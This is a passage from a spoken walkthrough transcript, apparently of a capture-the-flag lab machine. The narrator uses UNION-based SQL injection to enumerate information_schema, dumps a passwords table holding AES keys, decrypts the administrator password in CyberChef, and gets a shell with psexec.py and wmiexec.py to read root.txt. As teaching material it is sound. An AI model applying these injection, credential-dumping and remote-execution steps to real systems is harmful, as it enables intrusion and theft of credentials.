this reference and we want to look at the tables now so if we go to tables eventually we'll find it it's alphabetical it may be quicker for me just to search tables we can see this one has a table catalog table schema so schema is the database and table name so we want to select table underscore name from information schema dot tables and if we just left at this we get a lot information but we could say where and then we can say table underscore schema is equal to bread and we see there is only one table here and doing this piece um i don't really find too useful honestly because generally i don't enumerate the tables i go straight to the columns so if we go to this table this has table name column name and again table schema so and let's just do union select and we're going to select what table name and column name and we get a single injection error because the code is expecting just one value to return and we're returning two values this table name and column name we can just do a concat and if we do this it's going to put it in one value so we want table name colon column name let's see we screwed something up let's see administrator union select concat that is weird table underscore name column underscore name if we just do column name we air union select column underscore name from information underscore schema oh we have dot tables here and it's columns there we go so we have one table which is passwords and it has four values id account password and aes key so now what we can do is delete all this and we can say concat we probably want to know the account so account and then the next thing we want is the either password or aes key and then password and we just have to say from bread dot what was the table passwords and there we go we have dumped all the keys in that we got administrator here's the aes key and then here's the password so we just have to decrypt this and my favorite way to do any type of conversion is to use cyber chef so let's see if it will aes decrypt this so we're going to do aes decrypt and then we want to give it the key this is the aes key uh we don't know the iv i'm going to try putting all zeros until it's happy how many i've i wonder if we need to give it this input let's see invalid key length six bytes so this is raw or maybe latin one i got 15 bytes expects 16 bytes one two so we're just blanking out the initialization vector unable to decrypt with these parameters um we're giving it hex so we may have to decode this so we're giving it base 64. so from base64 up top okay input raw there we go so the issue was um our input was base64 and this didn't know how to handle it so we added the item from base64 so this convert to raw and then change the input type to raw and we get the password so now we should be able to like ps exact so ps exec.pi administrator at 10 10 10 2 2 8 paste the password and we'll see if it works um we may not get a shell back because antivirus has been an issue before and it looks like it's going to be an issue there but we can try wmx wmi exec 101010228 paste the password see it's using this we'll see if this works there we go so we can dir c colon users administrator uh we want to go desktop and we can get root.text and that will be the box so hope you guys enjoyed it take care and i will see you all next week